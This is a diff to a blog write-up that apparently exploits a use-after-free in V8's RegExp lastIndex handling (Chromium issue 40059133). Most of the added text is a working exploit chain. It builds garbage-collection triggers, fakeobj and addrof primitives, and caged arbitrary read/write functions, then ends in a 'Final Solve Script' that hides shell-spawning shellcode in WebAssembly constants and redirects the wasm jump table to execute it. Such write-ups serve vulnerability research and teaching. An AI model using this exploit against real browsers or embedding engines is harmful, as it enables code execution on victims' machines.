@@ -172,8 +172,9 @@ $$ [-2^{30}, 2^{30}-1] $$
 
 $$ [-1073741824, 1073741823] $$
 
-Now, let's take a look at the [vulnerability details](https://issues.chromium.org/action/issues/40059133/attachments/53188081?download=false)
-and try to re-create the PoC. Essentially, with the `SKIP_WRITE_BARRIER`, we
+Now, let's take a look at the [vulnerability details](https://issues.chromium.org/issues/40059133)
+and try to re-create the [PoC](https://issues.chromium.org/action/issues/40059133/attachments/53188081?download=false).
+Essentially, with the `SKIP_WRITE_BARRIER`, we
 could cause the GC to free the `HeapNumber` object created by `NewNumberFromInt64`
 which makes the `lastIndex` property to be a dangling pointer (UAF).
 
@@ -468,14 +469,14 @@ we can try to simulate some garbage collection to observe how `re` and `re.lastI
 var re = new RegExp("leet", "g");
 var exec_bak = RegExp.prototype.exec;  // backup original exec()
 RegExp.prototype.exec = function () { return null; };
-var n = 1073741824
+var n = 1073741824;
 re.exec = function () {
     re.lastIndex = n;
     delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
     return [""];  // to get into `SetAdvancedStringIndex`
 }
 re[Symbol.replace]("", "l33t");
-console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
+console.assert(re.lastIndex === n + 1);  // 1073741825 === 1073741824+1
 RegExp.prototype.exec = exec_bak;  // restore original exec()
 
 eval("%DebugPrint(re)");
@@ -601,7 +602,7 @@ transition to `OldSpace` since the GC is aware of the reference to `HeapNumber`.
 // pwn.js
 var re = new RegExp("leet", "g");
 var exec_bak = RegExp.prototype.exec;  // backup original exec()
-var n = 1073741824
+var n = 1073741824;
 re.exec = function () {
     re.lastIndex = n;
     delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
@@ -610,7 +611,7 @@ re.exec = function () {
 eval("%DebugPrint(re)");
 gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
 re[Symbol.replace]("", "l33t");
-console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
+console.assert(re.lastIndex === n + 1);  // 1073741825 === 1073741824+1
 RegExp.prototype.exec = exec_bak;  // restore original exec()
 
 eval("%DebugPrint(re)");
@@ -651,7 +652,7 @@ another minor GC, new object would now be allocated at `A` instead of `B`.
 var re = new RegExp("leet", "g");
 var exec_bak = RegExp.prototype.exec;  // backup original exec()
 RegExp.prototype.exec = function () { return null; };
-var n = 1073741824
+var n = 1073741824;
 re.exec = function () {
     re.lastIndex = n;
     delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
@@ -660,7 +661,7 @@ re.exec = function () {
 eval("%DebugPrint(re)");
 gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
 re[Symbol.replace]("", "l33t");
-console.assert(re.lastIndex == n + 1);  // 1073741825 == 1073741824+1
+console.assert(re.lastIndex === n + 1);  // 1073741825 === 1073741824+1
 RegExp.prototype.exec = exec_bak;  // restore original exec()
 
 eval("%DebugPrint(re)");
@@ -707,7 +708,504 @@ gef> tele 0x199c001c2148 10
 0x199c001c2190|+0x0048|+009: 0x4020333333333333
 ```
 
-TODO: create our own implementations to trigger major and minor gc
+> [!NOTE]
+> We could also immediately perform major gc after the first minor gc.
+> Further down this blog, I used major gc instead as in the attempt to
+> gain code execution via wasm, garbage collection is unwantedly triggered when
+> we try to import the wasm bytecode. This messes up our whole overlapping setup
+
+Now, instead of relying on `gc()` which is only accessible with `--expose-gc`
+command line flags, let's try to implement our own function which would trigger
+major/minor GC.
+
+```js
+// yoinked from https://issues.chromium.org/action/issues/40059133/attachments/53188081?download=false
+// and adjusted accordingly
+roots = new Array(0x20000);
+index = 0;
+
+function major_gc() {
+    new ArrayBuffer(0x40000000);
+}
+
+function minor_gc() {
+    for (var i = 0; i < 8; i++) {
+        roots[index++] = new ArrayBuffer(0x200000);
+    }
+    roots[index++] = new ArrayBuffer(8);
+}
+```
+
+When we try to call `major_gc()`, we could see that `--trace-gc` emit similar
+message to the one by `gc()`. The same goes to `minor_gc()`. However, our
+implementation of `minor_gc()` is not perfect as calling this function `n` times,
+occassionally, may not trigger exact `n` scavenging, there could be more or less
+scavenging. Thus, adjustment is necessary on different development environment.
+
+> [!NOTE]
+> It is better to try out your exploit without `--trace-gc` and without the
+> debugging code like `eval("%DebugPrint(re)")` as these consume memory space
+> and may mess up our calculation
+
+### fakeobj primitive
+
+To create a fake object primitive, we would need to align our `re.lastIndex` value
+with one of our `spray` array elements.
+If `&spray.elements` is located at slightly higher memory address, we could
+allocate some memory before `re.lastIndex` heap number is allocated like so.
+
+```js
+var n = 1073741824;
+re.exec = function () {
+    new Array(0x0d);  // padding to make re.lastIndex overlaps and perfectly align with our spray array elements
+    re.lastIndex = n;
+    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
+}
+```
+
+After trial-and-error, below is my result in which `re.lastIndex` overlaps
+with `spray[1]`.
+
+```console
+$ ./d8 --allow-natives-syntax --shell --trace-gc ./idk.js
+0x281a00048489 <JSRegExp <String[4]: #leet>>
+[22072:0x56501579c000]        3 ms: Mark-Compact (reduce) 0.6 (2.0) -> 0.6 (2.0) MB, 1.00 / 0.00 ms  (average mu = 0.518, current mu = 0.518) external memory pressure; GC in old space requested
+0x281a0019a7dd <JSRegExp <String[4]: #leet>>
+0x281a00282389 <HeapNumber 1073741825.0>
+[22072:0x56501579c000]        3 ms: Scavenge 0.6 (2.0) -> 0.6 (3.0) MB, 0.10 / 0.00 ms  (average mu = 0.518, current mu = 0.518) external memory pressure;
+[22072:0x56501579c000]        3 ms: Scavenge 0.6 (3.0) -> 0.6 (3.0) MB, 0.05 / 0.00 ms  (average mu = 0.518, current mu = 0.518) external memory pressure;
+[22072:0x56501579c000]        3 ms: Scavenge 0.6 (3.0) -> 0.6 (3.0) MB, 0.05 / 0.00 ms  (average mu = 0.518, current mu = 0.518) external memory pressure;
+[22072:0x56501579c000]        3 ms: Scavenge 0.6 (3.0) -> 0.6 (3.0) MB, 0.05 / 0.00 ms  (average mu = 0.518, current mu = 0.518) external memory pressure;
+0x281a0019a7dd <JSRegExp <String[4]: #leet>>
+0x281a00282421 <JSArray[20]>
+V8 version 12.2.0 (candidate)
+d8>
+```
+
+```console
+gef> tele 0x281a00282420
+0x281a00282420|+0x0000|+000: 0x000006cd0018ece1
+0x281a00282428|+0x0008|+001: 0x0000002800282379 ('y#('?)
+gef> tele 0x281a00282378
+0x281a00282378|+0x0000|+000: 0x0000002800000851
+0x281a00282380|+0x0008|+001: 0x3fb999999999999a
+0x281a00282388|+0x0010|+002: 0x3ff199999999999a
+0x281a00282390|+0x0018|+003: 0x4000cccccccccccd
+0x281a00282398|+0x0020|+004: 0x4008cccccccccccd
+0x281a002823a0|+0x0028|+005: 0x4010666666666666
+0x281a002823a8|+0x0030|+006: 0x4014666666666666
+0x281a002823b0|+0x0038|+007: 0x4018666666666666
+0x281a002823b8|+0x0040|+008: 0x401c666666666666
+0x281a002823c0|+0x0048|+009: 0x4020333333333333
+gef> p/f 0x3ff199999999999a
+$1 = 1.1000000000000001
+```
+
+Now, if `spray[1]` is equal to `0x000006cd0018ece1` in memory and `spray[2]`
+is equal to `0x0000002800282379`, when we do `%DebugPrint(re.lastIndex)`,
+it would show us that `re.lastIndex` is a double array of length `20`.
+
+```console
+$ ./d8 --allow-natives-syntax --shell --trace-gc ./idk.js
+0x279c000484bd <JSRegExp <String[4]: #leet>>
+[24846:0x5587f7ad2000]        3 ms: Mark-Compact (reduce) 0.6 (2.0) -> 0.6 (2.0) MB, 1.44 / 0.00 ms  (average mu = 0.488, current mu = 0.488) external memory pressure; GC in old space requested
+0x279c0019a811 <JSRegExp <String[4]: #leet>>
+0x279c00282389 <HeapNumber 1073741825.0>
+[24846:0x5587f7ad2000]        3 ms: Scavenge 0.6 (2.0) -> 0.6 (3.0) MB, 0.08 / 0.00 ms  (average mu = 0.488, current mu = 0.488) external memory pressure;
+[24846:0x5587f7ad2000]        4 ms: Scavenge 0.6 (3.0) -> 0.6 (3.0) MB, 0.04 / 0.00 ms  (average mu = 0.488, current mu = 0.488) external memory pressure;
+[24846:0x5587f7ad2000]        4 ms: Scavenge 0.6 (3.0) -> 0.6 (3.0) MB, 0.04 / 0.00 ms  (average mu = 0.488, current mu = 0.488) external memory pressure;
+[24846:0x5587f7ad2000]        4 ms: Scavenge 0.6 (3.0) -> 0.6 (3.0) MB, 0.03 / 0.00 ms  (average mu = 0.488, current mu = 0.488) external memory pressure;
+0x279c0019a811 <JSRegExp <String[4]: #leet>>
+0x279c00282421 <JSArray[20]>
+0x279c00282389 <JSArray[20]>
+V8 version 12.2.0 (candidate)
+d8>
+```
+
+Below is the script to get a fake double array object.
+
+```js
+roots = new Array(0x20000);
+index = 0;
+
+function major_gc() {
+    new ArrayBuffer(0x40000000);
+}
+
+function minor_gc() {
+    for (var i = 0; i < 8; i++) {
+        roots[index++] = new ArrayBuffer(0x200000);
+    }
+    roots[index++] = new ArrayBuffer(8);
+}
+
+function hex(i) {
+    return "0x" + i.toString(16)
+}
+
+var re = new RegExp("leet", "g");
+var exec_bak = RegExp.prototype.exec;  // backup original exec()
+RegExp.prototype.exec = function () { return null; };
+var n = 1073741824;
+re.exec = function () {
+    new Array(0x0d);
+    re.lastIndex = n;
+    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
+}
+major_gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
+re[Symbol.replace]("", "l33t");
+console.assert(re.lastIndex === n + 1);  // 1073741825 == 1073741824+1
+RegExp.prototype.exec = exec_bak;  // restore original exec()
+
+minor_gc();
+major_gc();
+
+var fakeobj = re.lastIndex;
+
+// 3.6943954791292419e-311 = 0x000006cd0018ece1
+// 0x0018ece1 is address of PACKED_DOUBLE_ELEMENTS map
+// 0x000006cd is address of PACKED_DOUBLE_ELEMENTS property
+
+// 0x00282301 is address of our fake double array element (could be any value, adjust to your needs)
+// 0x00100000 is the length of our fake double array
+// 2.2250738598067922e-308 = 0x0010000000282301
+
+var spray = [
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+];
+
+var fakelen = 0x00100000n;
+console.assert(BigInt(fakeobj.length) === fakelen >> 1n);
+console.log(`[*] fakeobj double array with length = ${hex(fakeobj.length)}`);
+eval("%DebugPrint(fakeobj)")
+```
+
+```console
+$ ./d8 --allow-natives-syntax ./idk.js
+[*] fakeobj double array with length = 0x80000
+0x15b5002821a1 <JSArray[524288]>
+```
+
+Now, since we have complete control over what object we could fake, let's try
+to build other primitives, e.g., `addrof` and caged arbitrary address read/write.
+
+### addrof primitive
+
+To craft `addrof` primitive, we would need another helper array to store our
+target object address. Next, we would need to get this array object element
+pointer such that we could use it on our fake array object. This value can be
+easily obtained from debugger.
+
+```console
+$ ./d8 --allow-natives-syntax --shell ./idk.js
+[*] fakeobj double array with length = 0x80000
+0x37ec002822a9 <JSArray[2]>
+V8 version 12.2.0 (candidate)
+d8>
+```
+
+```console
+gef> tele 0x37ec002822a9-0x1
+0x37ec002822a8|+0x0000|+000: 0x000006cd0018ed61
+0x37ec002822b0|+0x0008|+001: 0x0000000400282299   # 0x00282299
+```
+
+```js
+buf = new ArrayBuffer(8);
+float_view = new Float64Array(buf);
+u64_view = new BigUint64Array(buf);
+
+function itof(i) {
+    u64_view[0] = i;
+    return float_view[0];
+}
+
+function ftoi(f) {
+    float_view[0] = f;
+    return u64_view[0];
+}
+
+function lo(x) {
+    return x & BigInt(0xffffffff);
+}
+
+function hi(x) {
+    return (x >> 32n) & BigInt(0xffffffff);
+}
+
+var idx = 13;
+
+var addrof_arr = [spray, 0];
+let addrof_arr_el = 0x282299n;
+
+function addrof(o) {
+    spray[idx] = itof(addrof_arr_el | (fakelen << 32n));
+    addrof_arr[0] = o;
+    return lo(ftoi(fakeobj[0]));
+}
+
+console.log(hex(addrof(addrof_arr)));
+eval("%DebugPrint(addrof_arr)");
+```
+
+```console
+$ ./d8 --allow-natives-syntax ./idk.js
+[*] fakeobj double array with length = 0x80000
+0x2822a9
+0x2683002822a9 <JSArray[2]>
+```
+
+### Caged Arbitrary Address Read/Write Primitive
+
+To get caged arbitrary address read/write primitive, we just need to adjust
+our fake double array element pointer to memory address we want to act on.
+
+```js
+function cread32(addr) {
+    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
+    spray[offset] = itof(el_addr | fakelen << 32n);
+    return lo(ftoi(fakeobj[0]));
+}
+
+function cread64(addr) {
+    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
+    spray[offset] = itof(el_addr | fakelen << 32n);
+    return ftoi(fakeobj[0]);
+}
+
+function cwrite32(addr, data) {
+    let temp = cread32(addr+4n);
+    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
+    spray[offset] = itof(el_addr | fakelen << 32n);
+    fakeobj[0] = itof(data | temp << 32n)
+}
+
+function cwrite64(addr, data) {
+    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
+    spray[offset] = itof(el_addr | fakelen << 32n);
+    fakeobj[0] = itof(data)
+}
+
+let test = [6.6, 7.7]
+
+// trying to read test[0] by getting &test.elements
+let test_addr = addrof(test)
+let test_el_addr = cread32(test_addr+8n)
+let test_0 = cread64(test_el_addr+8n)
+console.log(itof(test_0), "===", test[0])
+
+// trying to modify test[0] and test[1] with our write primitive
+console.log(hex(ftoi(test[0])))
+console.log(hex(ftoi(test[1])))
+cwrite32(test_el_addr+8n, 0x13371337n)
+cwrite64(test_el_addr+8n+8n, 0xdeadbeefcafebaben)
+console.log(hex(ftoi(test[0])))
+console.log(hex(ftoi(test[1])))
+```
+
+```console
+$ ./d8 ./idk.js
+[*] fakeobj double array with length = 0x80000
+6.6 === 6.6
+0x401a666666666666
+0x401ecccccccccccd
+0x401a666613371337
+0xdeadbeefcafebabe
+```
+
+### Code Execution
+
+To gain code execution, we exploit the fact that wasm instance object stores a raw
+uncompressed pointer to a `RWX` memory page and overwrite it to point to our
+shellcode which we crafted as part of our wasm code. More details on this could
+be found in my post for [bi0sCTF 2024 - ezv8 revenge](../../../bi0s-2024/pwn/ezv8-revenge/#getting-code-execution).
+
+## Final Solve Script
+
+```js
+// ====================
+// | Helper Functions |
+// ====================
+roots = new Array(0x20000);
+index = 0;
+
+function major_gc() {
+    new ArrayBuffer(0x40000000);
+}
+
+function minor_gc() {
+    for (var i = 0; i < 8; i++) {
+        roots[index++] = new ArrayBuffer(0x200000);
+    }
+    roots[index++] = new ArrayBuffer(8);
+}
+
+function hex(i) {
+    return "0x" + i.toString(16)
+}
+
+buf = new ArrayBuffer(8);
+float_view = new Float64Array(buf);
+u64_view = new BigUint64Array(buf);
+
+function itof(i) {
+    u64_view[0] = i;
+    return float_view[0];
+}
+
+function ftoi(f) {
+    float_view[0] = f;
+    return u64_view[0];
+}
+
+function lo(x) {
+    return BigInt(x) & BigInt(0xffffffff);
+}
+
+function hi(x) {
+    return (BigInt(x) >> 32n) & BigInt(0xffffffff);
+}
+
+// ===========
+// | Exploit |
+// ===========
+var re = new RegExp("leet", "g");
+var exec_bak = RegExp.prototype.exec;  // backup original exec()
+RegExp.prototype.exec = function () { return null; };
+var n = 1073741824;
+re.exec = function () {
+    new Array(0x0d);
+    re.lastIndex = n;
+    delete re.exec;  // to pass `HasInitialRegExpMap` check and falls back to RegExp.prototype.exec to avoid infinite loop
+    return [""];  // to get into `SetAdvancedStringIndex`
+}
+major_gc();  // major gc / mark and sweep: forces `re` to move into `OldSpace`
+re[Symbol.replace]("", "l33t");
+console.assert(re.lastIndex === n + 1);  // 1073741825 == 1073741824+1
+RegExp.prototype.exec = exec_bak;  // restore original exec()
+
+minor_gc();
+major_gc();
+
+var fakeobj = re.lastIndex;
+
+// 3.6943954791292419e-311 = 0x000006cd0018ece1
+// 0x0018ece1 is address of PACKED_DOUBLE_ELEMENTS map
+// 0x000006cd is address of PACKED_DOUBLE_ELEMENTS property
+
+// 0x00282301 is address of our fake double array element (could be any value, adjust to your needs)
+// 0x00100000 is the length of our fake double array
+// 2.2250738598067922e-308 = 0x0010000000282301
+
+var spray = [
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+    3.6943954791292419e-311, 2.2250738598067922e-308,
+];
+
+var fakelen = 0x00100000n;
+console.assert(BigInt(fakeobj.length) === fakelen >> 1n);
+console.log(`[*] fakeobj double array with length = ${hex(fakeobj.length)}`);
+
+var idx = 13;
+
+var addrof_arr = [spray, 0];
+eval("%DebugPrint(addrof_arr)")
+let addrof_arr_el = 0x282299n;
+
+function addrof(o) {
+    spray[idx] = itof(addrof_arr_el | (fakelen << 32n));
+    addrof_arr[0] = o;
+    return lo(ftoi(fakeobj[0]));
+}
+
+function cread32(addr) {
+    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
+    spray[idx] = itof(el_addr | fakelen << 32n);
+    return lo(ftoi(fakeobj[0]));
+}
+
+function cread64(addr) {
+    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
+    spray[idx] = itof(el_addr | fakelen << 32n);
+    return ftoi(fakeobj[0]);
+}
+
+function cwrite32(addr, data) {
+    let temp = cread32(addr+4n);
+    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
+    spray[idx] = itof(el_addr | fakelen << 32n);
+    fakeobj[0] = itof(data | temp << 32n)
+}
+
+function cwrite64(addr, data) {
+    let el_addr = (BigInt(addr) - 0x8n) | 0x1n;
+    spray[idx] = itof(el_addr | fakelen << 32n);
+    fakeobj[0] = itof(data)
+}
+
+/*
+(module
+  (func (export "main") (result f64)
+    f64.const 1.617548436999262e-270
+    f64.const 1.6181477269733566e-270
+    f64.const 1.6305238557700824e-270
+    f64.const 1.6477681441619941e-270
+    f64.const 1.6456891197542608e-270
+    f64.const 1.6304734321072042e-270
+    f64.const 1.6305242777505848e-270
+    drop
+    drop
+    drop
+    drop
+    drop
+    drop
+  )
+  (func (export "pwn"))
+)
+*/
+var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 8, 2, 96, 0, 1, 124, 96, 0, 0, 3, 3, 2, 0, 1, 7, 14, 2, 4, 109, 97, 105, 110, 0, 0, 3, 112, 119, 110, 0, 1, 10, 76, 2, 71, 0, 68, 104, 110, 47, 115, 104, 88, 235, 7, 68, 104, 47, 98, 105, 0, 91, 235, 7, 68, 72, 193, 224, 24, 144, 144, 235, 7, 68, 72, 1, 216, 72, 49, 219, 235, 7, 68, 80, 72, 137, 231, 49, 210, 235, 7, 68, 49, 246, 106, 59, 88, 144, 235, 7, 68, 15, 5, 144, 144, 144, 144, 235, 7, 26, 26, 26, 26, 26, 26, 11, 2, 0, 11]);
+var module = new WebAssembly.Module(code);
+var instance = new WebAssembly.Instance(module, {});
+var wmain = instance.exports.main;
+for (let j = 0x0; j < 20000; j++) {
+    wmain();
+}
+
+instance_addr = addrof(instance);
+jump_table_start = instance_addr + 0x48n;
+rwx_addr = cread64(jump_table_start);
+sc_addr = rwx_addr + 0x81an - 0x5n;
+console.log("[+] Shellcode @", hex(sc_addr+0x5n));
+
+console.log("[+] Overwriting WasmInstanceObject jump_table_start to point to our shellcode");
+cwrite32(jump_table_start, sc_addr & BigInt(2**32-1));
+
+// to trigger jmp to address pointed by jump_table_start, we need another new function
+var pwn = instance.exports.pwn;
+console.log("[+] Executing shellcode");
+pwn();
+```
 
 ## Reference
 
